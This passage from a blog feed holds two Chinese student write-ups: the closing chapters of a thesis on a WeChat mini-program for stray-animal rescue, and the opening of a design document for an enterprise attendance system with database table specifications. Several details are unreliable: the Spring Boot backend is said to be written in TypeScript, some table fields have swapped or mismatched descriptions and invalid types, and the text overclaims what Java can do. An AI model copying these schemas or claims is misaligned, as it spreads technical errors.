src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\用户管理界面.jpg" style="zoom: 67%;" /><center>图5-5 用户管理界面</center>##### 5.1.5 菜单管理功能<p>菜单管理界面包含已经新增的所有菜单与按钮，已经被录入的菜单与按钮，才能被分配给管理员，经过分配后管理员才能拥有相关权限。如图5-6所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\菜单管理界面.jpg" style="zoom:67%;" /><center>图5-6 菜单管理界面</center>**5.1.6 动物分类管理功能**<p>动物分类管理界面，可以录入不同动物类型，方便用户选择动物类型进行信息发布与搜索，简洁高效，更精确的满足用户需求。如图5-7所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\动物分类管理界面.jpg" style="zoom:67%;" /><center>图5-7 动物分类管理界面</center>**5.1.7 寻宠管理功能**<p>寻宠管理界面展示所有用户发布的寻宠信息，可以查看当前寻宠信息是否已完成，可以进行热推让信息在小程序首页进行展示，管理员可以审核寻宠信息是否合规，不合规就禁止其发布，营造良好的网络环境。如图5-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\寻宠管理页面.jpg" style="zoom:67%;" /><center>图5-8 寻宠管理页面</center>##### 5.1.8 招领管理功能<p>招领管理界面展示所有用户发布的招领信息，可以查看当前招领信息是否已完成，可以进行热推让信息在小程序首页进行展示，管理员可以审核招领信息是否合规，不合规就禁止其发布。如图5-9所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\招领管理页面.jpg" style="zoom: 67%;" /><center>图5-9 招领管理页面</center>##### 5.1.9 轮播图管理功能<p>轮播图管理功能可以选择已发布的重要的寻宠与招领信息，通过点击发布使其在小程序首页进行轮播展示，更大限度的宣传流浪动物信息。如图5-10所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\轮播图管理界面.jpg" style="zoom:67%;" /><center>图5-10 轮播图管理界面</center>##### 5.1.10 反馈管理功能<p>反馈管理页面，负责接收用户的问题反馈，系统改进建议等，并在后台首页进行展示。管理员以及相关技术人员根据反馈及时改进系统功能，不断完善流浪动物救助系统。如图5-11所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\反馈管理界面.jpg" style="zoom:67%;" /><center>图5-11 反馈管理界面</center>##### 5.1.11 资讯管理功能<p>在资讯管理界面，管理员可以上传流浪动物救助相关事件与政策，在小程序首页进行展示宣传，提高用户对动物的爱护与救助意识。如图5-12所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\资讯管理界面.jpg" style="zoom:67%;" /> <center>图5-12 资讯管理界面</center>#### 5.2 用户功能实现<p>小程序用户模块主要实现发布、查看与救助相关流浪动物信息，完成动物救助与信息传播功能。用户具体拥有登录注册功能、个人中心功能、发布寻宠与招领信息功能、收藏功能、反馈功能与每日资讯功能等。</p><h5 id="5-2-1-登录注册功能">5.2.1 登录注册功能</h5><p>运行小程序进入登录界面，新用户进行注册，注册信息录入数据库后，用户可以成功进入小程序，若遗忘密码可以点击找回。如图5-13、图5-14、图5-15所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\登录界面.png"  />&nbsp<img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\注册界面.png"  />&nbsp<img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\忘记密码界面.png"  /></center> <center>图5-13&nbsp登录界面&nbsp &nbsp&nbsp&nbsp 图5-14&nbsp注册界面&nbsp&nbsp&nbsp&nbsp图5-15&nbsp忘记密码界面</center>##### 5.2.2 个人信息功能<p>在个人信息功能模块中，用户可以修改自己的个人资料，也可以修改帐号密码。单击“提交”按钮就可以进行个人资料的更新。如图 5-16、图5-17 所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\个人中心界面.png"  />&nbsp&nbsp&nbsp&nbsp<img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\信息修改界面.png"  /></center><center>图5-16 个人中心界面&nbsp&nbsp&nbsp&nbsp图5-17 信息修改界面</center>##### 5.2.3 寻宠功能<p>用户可以发布寻宠信息，通过选择动物类型精确查看寻宠信息及详情，不仅可以找回自己丢失的宠物，还可以收藏留意他人寻宠信息，促进形成互相帮助的良性循环。如图5-18、图5-19、图5-20所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\寻宠发布界面.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\寻宠界面.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\我的寻宠界面.png"  /></center><center>图5-18 寻宠发布界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-19 寻宠界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-20 我的寻宠界面</center>##### 5.2.4 招领功能<p>用户可以发布招领信息，通过选择动物类型精确查看招领信息及详情，不仅可以为动物寻找新主人，还可以收藏留意他人招领信息，领养一只属于自己的宠物，使流浪毛孩子不再流浪。如图5-21、图5-22、图5-23所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\招领发布界面.png"  />    <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\招领界面.png"  />    <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\我的招领界面.png"  /></center><center>图5-21 招领发布界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-22 招领界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-23 我的招领界面</center>##### 5.2.5 收藏功能<p>用户浏览动物信息，对于感兴趣的寻宠与招领信息进行收藏，实现信息的快速重现和个性化整理，在个人中心即可查看我的收藏，带给用户更快捷的体验。如图5-24所示</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\我的收藏界面.png"  /><center>图5-24&nbsp&nbsp&nbsp&nbsp我的收藏界面</center>##### 5.2.6 反馈功能<p>反馈功能作为产品方与用户之间沟通的桥梁，用户使用程序时遇到的问题，对程序的建议都可以反馈给管理员，根据用户反馈及时调整改善小程序，带给用户好的体验。如图5-25所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\反馈界面.png"  /><center>图5-25&nbsp&nbsp&nbsp&nbsp反馈界面</center>##### 5.2.7 查看资讯<p>用户可以从首页进入资讯页面，阅读学习流浪动物救助相关政策法规，提高用户对流浪动物救助的意识和相关政策的理解，提高人们的责任意识，正确看待、救助与爱护流浪动物。如图5-26、图5-27、图5-28所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\首页.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\每日资讯界面.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\资讯详情界面.png"  /><center><center>图5-26 首页&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-27 每日资讯界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-28 资讯详情界面</center># 6 总结<p>流浪动物救助问题是一个长期性、综合性的难题，无论是理论研究，还是系统的设计实现都具有一定的挑战性。系统的设计与实现利用新媒体技术介入解决流浪动物救助问题，探索流浪动物领养与救助在互联网时代下的创新，从实际出发，从动物的生命权与福利出发，通过运用文献研究、功能分析等方法对当前流浪动物存在的现状、原因、危害、已有的流浪动物治理模式以及相关者的需求进行了研究分析。最后结合互联网的优势，进行了融入情感化的设计，增加社交性和互动性，初步设计实现了基于微信小程序的流浪动物救助系统。</p><p>通过使用微信开发者工具创建小程序账号，初始化创建小程序项目。进行前端开发阶段，进行HTML、CSS和TypeScript的代码编写，利用微信小程序提供的组件和API构建与完善小程序的界面和功能，实现小程序内容与功能的基本渲染与实现，利用Vue框架基本完成后台管理系统页面的布局与实现。后端开发阶段，使用Spring Boot框架，编写TypeScript代码，通过Maven自动化构建工具完成包管理，实现处理接口的业务逻辑和数据交互，完成后端接口的准备与数据库结构设计。后端开发完成，完善前端小程序与后台管理系统，利用微信小程序提供的API调用后端接口，完善小程序与后台管理系统的数据访问与展示，实现数据交互。至此开发出小程序与前后端分离的、功能完善的、界面友好的基于微信小程序的流浪动物救助系统。</p><p>当前对流浪动物救助方面的关注与研究主要在保障流浪动物的生命权方面，在流浪动物的切实数据收集、解决流浪动物救助问题的实践、维护动物生存福利等方面上缺乏实现。流浪动物救助系统的开发与完善需要长期坚持，不断根据实际需求进行改进调整，在短时间内无法完整实现，所以流浪动物救助问题的解决并非一朝一夕之事，而是任重道远。</p><p>随着社会的发展与时代的进步，社会各界对流浪动物救助问题的意识逐渐提高，在保障流浪动物生存福利与完善流浪动物救助流程等方面的关注度在逐渐增加，相关政策的出台无疑是保障流浪动物们的生命线。随着国民对流浪动物救助问题的重视度的提高，社会各界自发公益救助动物，积极配合政府协同助力动物生命健康，促进人与动物和谐共生。未来，流浪动物救助与互联网的结合会越来越紧密，流浪动物救助系统也会一步完善与创新。</p><h2 id="参考文献">参考文献</h2><p>[1] 赵灿．《宠爱》移动应用设计的研究[D]．北京：北京印刷学院，2021：21-47．</p><p>[2] 邵帅．基于城市社区的社会创新设计研究[D]．合肥：合肥工业大学，2021：44-59．</p><p>[3] 李超．基于和谐社会视角下社会工作介入社区流浪动物现状及对策分析[D]．济南：山东大学，2024：12-48．</p><p>[4] 杨思涵．流浪动物相关法律与现实问题[J]．法制博览，2021(14)：154-156．</p><p>[5] 姜苏．基于互联网平台解决社会流浪动物问题的可行性研究[D]．泰安：山东农业大学，2021：21-47．</p><p>[6] 安琪．基于服务设计思维的城市流浪动物助养系统设计研究[D]．北京：北京化工大学，2023：9-59．</p><p>[7] 聂力，杜丹蕾，韦美雁等.基于微信小程序“送它回家”的设计与实现[J].电脑知识与技术,2023.19(02)：29-32．</p><p>[8] 郑妍，张未名，张润园等.基于云开发和微信小程序的爱宠家系统[J].电脑编程技巧与维护，2023(06)：79-81．</p><p>[9] 阙瑾蓉，卢嫣，丁雄等．“宠宠欲动”微信小程序设计与实现[J].信息系统工程，2021(02)：21-22．</p><p>[10] 卢艺轩,崔李宇,曹欣雨等.流浪犬猫的溯源生存现状及领养救助调研[J].中国动物保健,2022,24(12)：107-109．</p><p>[11] 邢月，喻德荣．简析流浪动物救助实践困境与路径优化[J]．大众标准化，2021(04)：71-73．</p><p>[12] 张家政．我国流浪动物的关怀伦理研究[D]．苏州：苏州科技大学，2023：8-11．</p><p>[13] 孙嘉慧．我国流浪动物致人损害侵权问题研究[D]．合肥：安徽大学，2023：10-16．</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毕业论文 </tag>
            
            <tag> MySQL </tag>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能考勤系统的设计与实现</title>
      <link href="/2024/09/02/%E6%99%BA%E8%83%BD%E8%80%83%E5%8B%A4%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/09/02/%E6%99%BA%E8%83%BD%E8%80%83%E5%8B%A4%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="智能考勤系统的设计与实现">智能考勤系统的设计与实现</h2><p>**摘要：**在经历过疫情严重的生活后，网上招聘就业越来越流行，人才市场就业愈发激烈，所以使用开发工具IDEA、SPRING等技术学习开发的企业智能考勤信息系统。帮助企业更高效的管理员工信息以及上下班考勤情况。此企业考勤系统主要包括系统主管理员模块、企业管理模块、员工上下班考勤和请假、部门薪资等一系列结合而成。该系统可以方便信息的共享和管理、提高人力资源管理效率以及实现薪资数据自动汇总分析。综上所述，该系统对于企业而言，不仅能够提高管理效率，降低管理成本，而且能够加强对人力资源的管理、实现对企业的整体监控，对企业的长期稳定发展具有一定的帮助作用。</p><p>**关键词：**企业考勤 人事 薪资管理 JAVA SPRING</p><h3 id="引言">引言</h3><p>企业考勤管理系统的理论最早起源于西方发达国家，它是市场经济高度发达和现代社会化大生产发展的产物。考勤系统的理念提出历史已经十分悠久，而且经过长时间的实践和验证，已经不断完善成为公司必不可少的体系结构，在各个领域都及早地实现了由人力管理转向计算机管理的模式。企业考勤管理系统是为了解决职工考勤管理问题而设计的，目的是要实现对职工考勤的智能化、规范化管理，帮助考勤工作人员利用计算机技术方便快速的对企业各个部门的考勤信息进行管理，使散乱的考勤信息能够具体化、直观化。这样，系统所需的考勤工作人员数量减少，同时也减轻了他们的负担，有利于提高企业考勤管理的效率。而且企业考勤管理系统运用计算机管理技术，并通过不断的实践和修改，避免了人为管理的一些主观问题，运用最少的人力资源，实现员工考勤的高效管理。</p><h3 id="1-系统开发技术">1 系统开发技术</h3><p>系统开发工具及环境如表1-1所示</p><center>表1-1 系统开发工具及环境</center>| 序号 | 开发工具及环境 | 版本号 || ---- | -------------- | ------ || 1    | Windows        | 10     || 2    | Java JDK       | 1.8    || 3    | Idea           | 2020   || 4    | Tomcat         | 9.0    || 5    | MySQL          | 5.7    |<p>企业考勤管理系统基于idea软件开发平台，采用三层体系结构、B/S模式，采用Tomcat9.0作为服务器管理程序，在服务器端用JSP编写程序，实现客户机和服务器之间的交互功能。运用JDBC实现和数据库服务器上的MySQL数据库的数据交换。用户通过在客户端登录进入系统，借助IE浏览器访问Web服务器，即实现客户端与web服务器之间信息的存储与传递。本系统主要应用的技术是数据库的JDBC技术、SQL语句、JSP的内建对象以及JavaBean。</p><ol><li><p>将整个企业考勤管理系统开发过程进行划分。</p></li><li><p>使用了SSM+JSP的开发方式，自下而上进行开发。</p></li><li><p>先完成管理方面业务，再进行普通员工的业务开发。</p></li><li><p>在系统分析以及系统设计时，先进行对整体的分析，在进行模块的细分。</p></li><li><p>在系统实施阶段从基本模块开始，按照系统设计要求完成模块，再逐步拼接模块进行调试，最终完成整个系统</p></li></ol><h4 id="1-1-idea-2020">1.1  IDEA 2020</h4><p>IDEA全称IntelliJ IDEA，是Java语言开发的集成环境，是JetBrains公司的产品。IntelliJ在业界被公认为最好的Java开发工具，尤其在智能代码助手、代码自动提示、重构、Java EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、创新的GUI设计等方面的功能可以说是超常的。IDEA提倡的是智能编码，目的是减少程序员的工作，其特色功能有智能的选取、丰富的导航模式、历史记录功能等，最突出的功能是调试（Debug），可以对Java代码、JavaScript、JQuery等技术进行调试。因此智能考勤系统使用IDEA进行开发。</p><h4 id="1-2-java">1.2  JAVA</h4><p>Java是一种可以撰写跨平台应用程序的面向对象的程序设计语言。Java技术具有卓越的通用性、高效性、平台移植性和安全性，广泛应用于PC、数据中心、游戏控制台、科学超级计算机、移动电话和互联网，同时拥有全球最大的开发者专业社群。Java是功能完善的通用程序设计语言，可以用来开发可靠的、要求严格的应用程序。Java是纯面向对象开发，功能强大，分支众多，没有java不能做的软件。C/S也好B/S也好。从功能上讲，没有语言可以和Java相比。</p><h4 id="1-3-jsp">1.3  JSP</h4><p>JSP [Java Server Pages]，中文名是Java服务器页面，是一个简化的Servlet设计，是一种动态网页技术标准。JSP在传统的网页HTML [标准通用标记语言]的子集文件 [.htm，.html]中插入Java程序段 [Script lets]和JSP标记 [tag]，从而形成JSP文件，后缀名为[.jsp]。JSP实现了Html语法中的java扩展（以 &lt;%，%&gt;形式）。通常返回给客户端的就是一个HTML文本，因此客户端只要有浏览器就能浏览。JSP技术使用Java编程语言编写类XML的tags和script lets，来封装产生动态网页的处理逻辑。网页还能通过tags和script lets访问存在于服务端的资源的应用逻辑。JSP将网页逻辑与网页设计的显示分离，支持可重用的基于组件的设计，使基于Web的应用程序的开发变得容易。</p><h4 id="1-4-tomcat">1.4  Tomcat</h4><p>Tomcat服务器是一个开放源代码的免费的轻量级Web应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用。Tomcat可以用来装载Java Web程序，它是一个Servlets容器。它是一个中间件，在B/S架构中，浏览器发出的HTTP请求经过Tomcat中间件，转发到最终的目的服务器上，响应消息再通过Tomcat返回到浏览器。Tomcat所做的事情主要有：开启监听端口监听用户的请求，解析用户发来的HTTP请求然后访问到你指定的应用系统，然后你返回的页面经过Tomcat返回给用户。</p><h3 id="2系统需求分析">2系统需求分析</h3><p>企业考勤管理系统是企事业单位不可或缺的一部分，最初的考勤管理都是靠人工来完成的。当企业规模比较小的时候，人工可以完成，随着企业的规模越来越大，企业的员工人数也越来越多，人力进行考勤管理必然会造成工作效率低，工作错误增高的问题。因此对于企业来说，开发一个智能化、高效率的企业考勤管理系统是非常有必要的，具有深远的意义。</p><h4 id="2-1-系统功能需求分析">2.1  系统功能需求分析</h4><p>智能考勤系统应当具有足以满足企业日常需要的各项功能以方便管理，如下表中所示的八项功能</p><center>表2-1 系统功能</center>| 序号 | 功能名称 | 功能描述                         || ---- | -------- | -------------------------------- || 01   | 用户管理 | 使用考勤系统的所有用户信息       || 02   | 部门管理 | 企业所有的部门信息               || 03   | 职称管理 | 部门的职称                       || 04   | 员工管理 | 企业员工信息                     || 05   | 考勤管理 | 员工打卡签到信息管理员工加班管理 || 06   | 请假管理 | 员工请假信息申请批准             || 07   | 公告管理 | 公告信息                         || 08   | 薪资管理 | 薪资信息                         |<h3 id="3-系统设计">3 系统设计</h3><h4 id="3-1-系统体系结构设计">3.1 系统体系结构设计</h4><p>企业考勤管理系统分为三层，具体如图3-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\企业考勤管理系统体系结构图.png" style="zoom:67%;" /><center>图3-1 企业考勤管理系统体系结构图</center>####  3.2 系统功能结构设计<p>企业考勤管理系统的模块分为10部分，分别为注册登录、个人信息管理、请假信息管理、员工管理、加班信息管理、考勤信息管理、部门管理、职称管理、公告管理以及薪资管理，如图3-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\企业考勤管理系统结构图.png" style="zoom:80%;" /><center>图3-2 企业考勤管理系统结构图</center>系统分为多个角色，可以通过人事部主任账号对员工信息管理，以及对部门信息和职称信息统一管理，不同员工登陆的系统后可以操作不同的菜单功能。具体设计如图3-3、图3-4所示。<center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\管理员用例图.png" style="zoom:50%;" /><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\企业员工用例图.png" style="zoom:50%;" /></center><center>图3-3 管理员用例图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图3-4 企业员工用例图</center>#### 3.3 系统业务流程<p>管理员可以查看员工的考勤信息。部门主任在员工考勤完成后可以查看员工的考勤信息。人事部员工可以管理各个模块的信息。人事部主任可以管理所有信息同时负责员工的请假加班。具体业务流程如图3-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\核心业务流程图.png" style="zoom: 80%;" /><center>图3-5 核心业务流程图</center>#### 3.4 系统数据流分析<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\顶层数据流图.png" style="zoom:80%;" /><center>图3-6 顶层数据流图</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\一层数据流图.png" style="zoom:67%;" /><center>图3-7 一层数据流图</center>#### 3.5 数据库概念结构设计<p>人事部主任可以管理员工信息，员工添加请假信息，人事部主任负责审批请假信息。人事部主任管理员工的加班信息、公告信息。部门信息包括部门名称和部门职能，人事部主任管理部门信息和职能信息。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\系统整体E-R图.png" style="zoom: 67%;" /><center>图3-8 系统整体E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps13.png" style="zoom:50%;" /><center>图3-9员工表属性图</center>员工表的属性图如图3-9所示。其中员工ID为主键。员工通过用户名和密码来登录系统进行考勤。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps14.png" style="zoom:50%;" /><center>图3-10 部门表属性图</center>部门表的属性图如图3-10所示。部门表包括部门信息和部门职能，以及管理人员和联系方式。 <img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps15.png" alt="img" style="zoom:50%;" /><center>图3-11 职称表属性图</center>职能表的属性图如图3-11所示。职能表属于部门信息的一部分， 每个职能有自己的id和编号，名称，以及所属的哪个部门。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps16.png" style="zoom:50%;" /><center>图3-12 加班表属性图</center>加班表的属性图如图3-12所示。加班表负责储存需要加班的员工的信息，开始加班的时间和结束加班的时间。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps17.png" style="zoom:60%;" /><center>图3-13 请假表属性图</center>请假表的属性图如上图3-13所示。请假表负责储存请假员工的信息以及所属部门，请假天数，日期和原因。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps18.png" style="zoom:60%;" /><center>图3-14 考勤表属性图</center>考勤表的属性图如图3-14所示。考勤表负责记录员工的考勤时间，判断员工是否迟到。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps19.png" style="zoom:60%;" /><center>图3-15 公告表属性图</center>公告表的属性图如图3-15所示。公告表负责发布公告信息。<h4 id="3-6-数据库结构设计">3.6 数据库结构设计</h4><center>表3-2 数据库关系模式表</center>| 数据库表             | 关系模式                                                     || -------------------- | ------------------------------------------------------------ || `attendance`         | ( `id``employee_number``day` `time_type` `start_time` `start_type``end_time` `end_type``work_type`  `notes`) || `department`         | ( `id` `department_number` `name` `manager` `telephone` `address` `notes` ) || `employee`           | (`id` `employee_number` `name` `gender` `birthday` `telephone` `email` `address` `photo` `education``department_number` `position_number` `in_time` `password` `notes` ) || `gonggao`            | (`id`  `title` `content`)                                    || `history`            | (`id``employee_number` `name``gender` `birthday``telephone``email` `address` `photo`  `education``in_time` `out_time` `department_number` `position_number``status`  `home``notes`) || `lea`                | (`id` `employee_number` `department_number` `start_time` `end_time``days``reason` `type``manager` `status`  `notes`) || `move`               | ( `id` `employee_number` `before` `after` `time` `manager` `notes` ) || `overtime`           | (`id` `department_number` `employee_number` `day``start_time` `end_time` `notes`) || `position`           | ( `id` `position_number` `name`  `level` `notes`)            || `rewards_punishment` | (`id``employee_number``type``reason` `money`  `time` `manager``notes`) |<p>每张表具体的逻辑设计及其功能信息如表3-3所示。</p><center>表3-3 表</center>| 数据库表     | 表名       | 表功能             || ------------ | ---------- | ------------------ || `attendance` | 考勤表     | 存放考勤的基本信息 || `department` | 部门表     | 存放部门基本信息   || `employee`   | 员工表     | 存放员工基本信息   || `gonggao`    | 公告表     | 存放公告基本信息   || `history`    | 员工调度表 | 存放档案基本信息   || `lea`        | 请假表     | 存放请假基本信息   || `move`       | 离职表     | 存放离职基本信息   || `overtime`   | 加班表     | 存放加班基本信息   || `position`   | 职称表     | 存放职称基本信息   |<p><code>attendanc</code>表结构设计如表3-4所示。</p><center>表3-4attendance表结构设计</center>| No   | 字段名            | 类型    | 长度 | 主键/外键 | 描述     || ---- | ----------------- | ------- | ---- | --------- | -------- || 1    | `id`              | int     | 100  | 主键      | ID       || 2    | `employee_number` | int     | 10   |           | 员工编号 || 3    | `day`             | date    | 0    |           | 时间     || 4    | `time_type`       | Data    | 0    |           | 时间类型 || 5    | `start_time`      | time    | 0    |           | 开始时间 || 6    | `start_type`      | Data    | 0    |           | 开始类型 || 7    | `end_time`        | time    | 0    |           | 结束时间 || 8    | `end_type`        | Data    | 0    |           | 结束类型 || 9    | `work_type`       | Varchar | 0    |           | 工作类型 || 10   | `notes`           | varchar | 255  |           | 备注     |<p><code>department</code>表结构设计如表3-5所示。</p><center>表3-5 department表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | Int     | 10   | 主键      | ID       || 2    | `department_number` | Int     | 10   |           | 部门编号 || 3    | ` `name``           | Varchar | 20   |           | 名称     || 4    | `manager`           | Varchar | 10   |           | 管理     || 5    | `telephone`         | Varchar | 20   |           | 联系方式 || 6    | `address`           | Varchar | 50   |           | 地址     || 7    | `notes`             | Varchar | 255  |           | 备注     |<p><code>employee</code>表结构设计如表3-6所示。</p><center>表3-6 employee表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | Int     | 10   | 主键      | ID       || 2    | `employee_number`   | Int     | 10   |           | 员工编号 || 3    | ` name`             | Varchar | 10   |           | 名称     || 4    | `gender`            | Varchar | 0    |           | 性别     || 5    | `birthday`          | Date    | 0    |           | 生日     || 6    | `telephone`         | Varchar | 15   |           | 联系方式 || 7    | `email`             | Varchar | 30   |           | 邮箱     || 8    | `address`           | Varchar | 50   |           | 地址     || 9    | `photo`             | Varchar | 50   |           | 照片     || 10   | `education`         | Varchar | 20   |           | 教育     || 11   | `department_number` | Int     | 10   |           | 部门编号 || 12   | `position_number`   | Int     | 10   |           | 职称编号 || 13   | `in_time`           | Date    | 0    |           | 参加时间 || 14   | `password`          | Varchar | 20   |           | 密码     || 15   | `notes`             | Varchar | 255  |           | 状态     |<p><code>gonggao</code>表结构设计如表3-7所示。</p><center>表3-7 gonggao表结构设计</center>| No   | 字段名    | 类型    | 长度 | 主键/外键 | 描述 || ---- | --------- | ------- | ---- | --------- | ---- || 1    | `id`      | Int     | 11   | 主键      | ID   || 2    | `title`   | Varchar | 255  |           | 标题 || 3    | `content` | Varchar | 255  |           | 详情 |<p><code>history</code>表结构设计如表3-8所示。</p><center>表3-8 history表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | int     | 10   | 主键      | ID       || 2    | `employee_number`   | int     | 10   |           | 员工编号 || 3    | ` name`             | varchar | 10   |           | 名称     || 4    | `gender`            | Varchar | 0    |           | 性别     || 5    | `birthday`          | date    | 0    |           | 生日     || 6    | `telephone`         | varchar | 20   |           | 联系方式 || 7    | `email`             | varchar | 30   |           | 邮箱     || 8    | `address`           | varchar | 50   |           | 地址     || 9    | `photo`             | varchar | 50   |           | 照片     || 10   | `education`         | varchar | 20   |           | 教育     || 11   | `department_number` | Int     | 10   |           | 部门编号 || 12   | `position_number`   | Int     | 10   |           | 职称编号 || 13   | `in_time`           | date    | 0    |           | 参加时间 || 14   | `out_time`          | varchar | 0    |           | 离职时间 || 15   | `notes`             | varchar | 255  |           | 备注     || 16   | `status`            | varchar | 255  |           | 状态     |<p><code>lea</code>表结构设计如表3-9所示。</p><center>表3-9 lea表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | int     | 10   | 主键      | ID       || 2    | `employee_number`   | int     | 10   |           | 员工编号 || 3    | `department_number` | varchar | 10   |           | 部门编号 || 4    | `start_time`        | enum    | 0    |           | 入职时间 || 5    | `end_time`          | date    | 0    |           | 离职时间 || 6    | `days`              | varchar | 10   |           | 天数     || 7    | `reason`            | varchar | 100  |           | 原因     || 8    | `type`              | varchar | 0    |           | 类型     || 9    | `manager`           | varchar | 10   |           | 管理人   || 10   | `notes`             | varchar | 255  |           | 备注     || 11   | `status`            | varchar | 255  |           | 状态     |<p><code>move</code>表结构设计如表3-10所示。</p><center>表3-10 move表结构设计</center>| No   | 字段名            | 类型    | 长度 | 主键/外键 | 描述     || ---- | ----------------- | ------- | ---- | --------- | -------- || 1    | `id`              | int     | 10   | 主键      | ID       || 2    | `employee_number` | int     | 10   |           | 员工编号 || 3    | `before`          | varchar | 10   |           | 之后     || 4    | `after`           | Varchar | 10   |           | 之前     || 5    | `time`            | date    | 0    |           | 时间     || 6    | `manager`         | varchar | 10   |           | 管理人   || 7    | `notes`           | varchar | 255  |           | 备注     |<p><code>overtime</code>表结构设计如表3-11所示。</p><center>表3-11  overtime表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | int     | 10   | 主键      | ID       || 2    | `employee_number`   | int     | 10   |           | 员工编号 || 3    | `department_number` | varchar | 10   |           | 之后     || 4    | `day`               | Varchar | 0    |           | 之前     || 5    | `time`              | date    | 0    |           | 时间     || 6    | `manager`           | varchar | 0    |           | 管理人   || 8    | `status`            | varchar |      |           | 状态     |<p><code>position</code>表结构设计如表3-12所示。</p><center>表3-12 position表结构设计</center>| No   | 字段名            | 类型    | 长度 | 主键/外键 | 描述     || ---- | ----------------- | ------- | ---- | --------- | -------- || 1    | `id`              | int     | 10   | 主键      | ID       || 2    | `position_number` | int     | 10   |           | 职称编号 || 3    | `name`            | varchar | 20   |           | 名称     || 4    | `level`           | Varchar | 0    |           | 级别     || 5    | `notes`           | varchar | 255  |           | 备注     |<h3 